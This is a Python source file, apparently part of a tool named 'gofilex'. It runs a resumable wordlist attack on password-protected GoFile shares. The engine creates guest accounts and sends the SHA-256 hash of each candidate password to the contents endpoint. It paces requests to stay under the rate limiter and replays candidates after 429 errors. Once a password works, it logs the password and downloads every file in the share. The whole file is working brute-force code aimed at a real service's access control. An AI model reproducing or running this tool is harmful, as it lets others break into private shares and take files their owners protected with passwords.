"""Guess loop: sequential, resumable, rate-limit first."""

from __future__ import annotations

import asyncio
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path

import httpx

from .api import GofileClient, ListingResult, sanitize_filename
from .session import Session, now_iso
from .wordlist import Candidate, WordlistQueue, sha256_hex, usable_password

OPERATOR = ""
SAVE_EVERY_ATTEMPTS = 1

LogFn = Callable[[str, str], None]  # (kind, message)

@dataclass
class EngineState:
    running: bool = False
    paused: bool = False
    last_candidate: Candidate | None = None
    last_listing: ListingResult | None = None
    attempts: int = 0
    skips: int = 0
    found: str | None = None

class Engine:
    def __init__(self, session: Session, client: GofileClient, log: LogFn) -> None:
        self.session = session
        self.client = client
        self.log = log
        self.state = EngineState()
        self._task: asyncio.Task[None] | None = None
        self._save_every = SAVE_EVERY_ATTEMPTS
        self._attempts_since_save = 0
        if session.found_password:
            self.state.found = session.found_password

    def _emit(self, kind: str, message: str) -> None:
        self.log(kind, message)

    async def ensure_account(self) -> bool:
        account = self.session.account
        if account.token:
            self.client.token = account.token
            self._emit("sys", f"reusing account {OPERATOR}  tier={account.tier or '?'}")
            return True
        self._emit("sys", "no stored token — POST /accounts (guest, documented)")
        created = await self.client.create_guest()
        if not created.ok:
            self._emit(
                "err",
                f"guest create failed: {created.api_status} HTTP {created.http_status}",
            )
            return False
        account.id = str(created.data.get("id") or "")
        account.token = str(created.data.get("token") or "")
        account.tier = str(created.data.get("tier") or "guest")
        account.root_folder = str(created.data.get("rootFolder") or "")
        account.synced_at = now_iso()
        self.client.token = account.token
        ident = await self.client.get_id()
        if ident.ok:
            account.email = str(ident.data.get("email") or account.email)
            account.tier = str(ident.data.get("tier") or account.tier)
            account.id = str(ident.data.get("id") or account.id)
        self.session.save()
        self._emit(
            "sys",
            f"guest minted  id={account.id}  operator={OPERATOR}  "
            f"token={account.token[:8]}…  (save this; it is the only recovery key)",
        )
        return True

    async def refresh_account_stats(self) -> None:
        account = self.session.account
        if not account.id:
            ident = await self.client.get_id()
            if ident.ok:
                account.id = str(ident.data.get("id") or "")
                account.email = str(ident.data.get("email") or account.email)
                account.tier = str(ident.data.get("tier") or account.tier)
        if not account.id:
            return
        details = await self.client.get_account(account.id)
        if details.ok:
            account.email = str(details.data.get("email") or account.email)
            account.tier = str(details.data.get("tier") or account.tier)
            account.root_folder = str(details.data.get("rootFolder") or account.root_folder)
            account.stats_current = details.data.get("statsCurrent") or {}
            account.ip_traffic = details.data.get("ipTraffic")
            account.synced_at = now_iso()
            self.session.account = account
            self.session.save()
            self._emit("sys", f"account sync  tier={account.tier}  stats={account.stats_current}")
        else:
            self._emit("warn", f"account sync {details.api_status} HTTP {details.http_status}")

    async def heartbeat(self) -> ListingResult | None:
        """One GET /contents. Never loops. Counts toward the listing budget."""
        token = self.session.account.token
        if not token:
            self._emit(
                "err",
                "heartbeat skipped — no token. /guest or /token first (that is a separate call).",
            )
            return None
        if not self.session.content_id:
            self._emit("err", "heartbeat skipped — no target. /target <gofile url or id> first.")
            return None
        self.client.token = token
        wait = self.client.limiter.wait_seconds("contents")
        if wait > 0.5:
            self._emit(
                "warn",
                f"heartbeat not sent — listing slot in {wait:.0f}s. "
                "The limiter already has a live request on the clock; sending now would stack calls.",
            )
            return None
        interval = self.client.limiter.contents_interval
        self._emit(
            "sys",
            f"heartbeat  GET /contents/{self.session.content_id}  "
            f"(one shot, counts as a listing request, next slot +{interval:.0f}s)",
        )
        listing = await self.client.get_contents(self.session.content_id)
        self.state.last_listing = listing
        snap = self.client.limiter.endpoint("contents")
        if listing.ok:
            self.client.limiter.paused = False
            self.client.limiter.pause_reason = ""
            next_s = self.client.limiter.wait_seconds("contents")
            self._emit(
                "ok",
                f"heartbeat ok  HTTP {listing.http_status}  "
                f"contents req={snap.requests} ok={snap.ok}  next listing in {next_s:.0f}s",
            )
            self._describe_listing(listing)
        elif listing.rate_limited:
            wait = self.client.limiter.wait_seconds("contents")
            self._emit("warn", f"heartbeat 429  counted  cooldown {wait:.0f}s  paused")
        else:
            detail = listing.data.get("message") or listing.api_status
            self._emit(
                "err",
                f"heartbeat {listing.api_status} HTTP {listing.http_status}  {detail}  "
                f"counted  contents req={snap.requests}",
            )
        self.session.save()
        return listing

    async def probe(self) -> ListingResult | None:
        return await self.heartbeat()

    def _describe_listing(self, listing: ListingResult) -> None:
        if listing.not_premium:
            self._emit(
                "err",
                "GET /contents is Premium-badged. Website-token was rejected "
                "(salt rotated?) or the share is not publicly listable. "
                "Paste a Premium token with /token <value> from https://gofile.io/myprofile",
            )
            return
        if not listing.ok:
            detail = listing.data.get("message") or ""
            extra = f"  {detail}" if detail else ""
            self._emit("err", f"listing {listing.api_status} HTTP {listing.http_status}{extra}")
            return
        name = listing.data.get("name") or listing.data.get("id") or self.session.content_id
        kind = listing.data.get("type") or "?"
        if listing.needs_password:
            status = listing.password_status or "passwordRequired"
            self._emit("sys", f"gate  {kind} {name!r}  password-protected  status={status}")
        elif listing.password_ok:
            n = len(listing.children)
            public = listing.data.get("public")
            self._emit("ok", f"open  {kind} {name!r}  children={n}  public={public}")
        else:
            self._emit(
                "warn",
                f"listing ok but gated  canAccess={listing.can_access}  "
                f"public={listing.data.get('public')}  expire={listing.data.get('expire')}",
            )

    async def try_password(
        self,
        password: str,
        *,
        consume: Candidate | None = None,
    ) -> ListingResult | None:
        if not usable_password(password):
            self._emit("warn", f"skip local  {password!r}  (GoFile passwords are 4–100 chars)")
            if consume:
                consume.skipped = True
            return None
        if not self.session.content_id:
            self._emit("err", "no target — /target <gofile url or id>")
            return None
        if not await self.ensure_account():
            return None
        digest = sha256_hex(password)
        listing = await self.client.get_contents(self.session.content_id, digest)
        if listing.rate_limited:
            wait = self.client.limiter.wait_seconds("contents")
            self._emit("warn", f"429 error-rateLimit  cooldown {wait:.0f}s  password NOT consumed")
            return listing
        if listing.api_status == "error-network":
            wait = self.client.limiter.wait_seconds("contents")
            self._emit(
                "err",
                f"network error  {listing.data.get('message') or ''}  "
                f"paused  retry-after {wait:.0f}s  password NOT consumed",
            )
            return listing
        self.state.last_listing = listing
        self.state.attempts += 1
        if consume:
            rec = self.session.current_wordlist()
            if rec:
                rec.tried += 1
            self.session.mark_attempt(consume.wordlist, consume.line, consume.password)
        else:
            self.session.mark_attempt("manual", 0, password)
        if listing.password_ok and listing.ok and listing.can_access is not False:
            self._on_found(password, listing)
        elif listing.password_wrong or listing.needs_password:
            shown = password if len(password) <= 40 else password[:37] + "..."
            src = f"{consume.wordlist}:{consume.line}  " if consume else ""
            self._emit("fail", f"{src}{shown!r}  {listing.password_status or 'no-access'}")
        else:
            status = listing.password_status
            self._emit("warn", f"unexpected  {listing.api_status}  status={status}")
        self._maybe_save()
        return listing

    def _on_found(self, password: str, listing: ListingResult) -> None:
        self.state.found = password
        self.session.found_password = password
        self.session.found_at = now_iso()
        self.session.listing = {
            "id": listing.data.get("id"),
            "name": listing.data.get("name"),
            "type": listing.data.get("type"),
            "children": [
                {
                    "id": child.get("id"),
                    "name": child.get("name"),
                    "type": child.get("type"),
                    "size": child.get("size"),
                    "mimetype": child.get("mimetype"),
                    "link": child.get("link"),
                }
                for child in listing.children
            ],
        }
        self.session.engine_state = "found"
        self.session.save()
        self._emit("ok", f"PASSWORD OK  {password!r}")
        for child in listing.children:
            self._emit(
                "sys",
                f"  {child.get('type')}  {child.get('name')}  "
                f"{child.get('size')} bytes  {child.get('mimetype') or ''}",
            )

    def is_alive(self) -> bool:
        return bool(self._task and not self._task.done())

    def _maybe_save(self, force: bool = False) -> None:
        self._attempts_since_save += 1
        if force or self._attempts_since_save >= self._save_every:
            self.session.save()
            self._attempts_since_save = 0

    async def start(self) -> None:
        if self.is_alive():
            self._emit("warn", "already running")
            return
        if self.session.found_password:
            found = self.session.found_password
            self._emit("ok", f"already unlocked with {found!r} — /dl to download")
            return
        if not self.session.content_id:
            self._emit("err", "no target — /target <gofile url or id>")
            return
        if not self.session.wordlists:
            self._emit("err", "no wordlists — /wl add /path/to/list.txt")
            return
        self.state.running = True
        self.state.paused = False
        self.session.engine_state = "running"
        self.client.limiter.paused = False
        self.client.limiter.pause_reason = ""
        self._task = asyncio.create_task(self._run(), name="gofilex-engine")

    def pause(self) -> None:
        self.state.paused = True
        self.session.engine_state = "paused"
        self._emit("sys", "paused — /resume to continue")
        self.session.save()

    def resume(self) -> None:
        self.state.paused = False
        self.client.limiter.paused = False
        self.session.engine_state = "running"
        self._emit("sys", "resumed")

    def stop(self) -> None:
        self.state.running = False
        self.state.paused = False
        self.session.engine_state = "idle"
        self.session.save()
        self._emit("sys", "stopped")

    async def _run(self) -> None:
        try:
            if not await self.ensure_account():
                return
            queue = WordlistQueue(self.session.wordlists)
            queue.ensure_totals()
            self.session.save()
            self._emit("sys", "wordlist run starting (sequential, rate-limited)")
            while self.state.running and not self.state.found:
                if self.state.paused or self.client.limiter.paused:
                    if self.client.limiter.paused and self.client.limiter.pause_reason:
                        self._emit("err", self.client.limiter.pause_reason)
                        self.state.paused = True
                        self.session.engine_state = "paused"
                        self.session.save()
                    await asyncio.sleep(0.25)
                    continue
                candidate = queue.next_candidate()
                if candidate is None:
                    self._emit("sys", "wordlist queue exhausted")
                    break
                self.state.last_candidate = candidate
                if candidate.skipped:
                    self.state.skips += 1
                    continue
                listing = await self.try_password(candidate.password, consume=candidate)
                if listing is None:
                    continue
                if listing.rate_limited or listing.api_status == "error-network":
                    rec = self.session.current_wordlist()
                    if rec and candidate:
                        queue.rewind(rec, candidate)
                    self.session.save()
                    continue
                if listing.not_premium:
                    self._emit("err", "premium gate — stopping so we do not burn the wordlist")
                    break
                if self.state.found:
                    break
            self.state.running = False
            if self.state.found:
                self.session.engine_state = "found"
            elif self.session.engine_state == "running":
                self.session.engine_state = "idle"
            self.session.save()
        except asyncio.CancelledError:
            self.state.running = False
            raise
        except Exception as exc:
            self.state.running = False
            self._emit("err", f"engine crash: {type(exc).__name__}: {exc}")
            self.session.save()

    async def download_all(self, dest_dir: str | Path | None = None) -> list[Path]:
        listing = self.state.last_listing
        if not (listing and listing.password_ok):
            if self.session.found_password:
                listing = await self.client.get_contents(
                    self.session.content_id,
                    sha256_hex(self.session.found_password),
                )
            else:
                self._emit("err", "nothing to download — unlock first")
                return []
        dest = Path(dest_dir or self.session.download_dir or Path.cwd() / "downloads")
        dest.mkdir(parents=True, exist_ok=True)
        self.session.download_dir = str(dest)
        saved: list[Path] = []
        files = [c for c in listing.children if c.get("type") == "file" and c.get("link")]
        if listing.data.get("type") == "file" and listing.data.get("link"):
            files = [listing.data]
        if not files:
            self._emit("warn", "listing has no file links (folder ZIP is Premium-only)")
            return []
        for item in files:
            name = sanitize_filename(str(item.get("name") or item.get("id") or "file"))
            path = dest / name
            self._emit("sys", f"GET {name}  →  {path}")
            try:
                await self.client.download_file(str(item["link"]), path)
                saved.append(path)
                self._emit("ok", f"saved {path}  ({item.get('size') or path.stat().st_size} bytes)")
            except (OSError, httpx.HTTPError, ValueError) as exc:
                self._emit("err", f"download failed {name}: {exc}")
        self.session.save()
        return saved
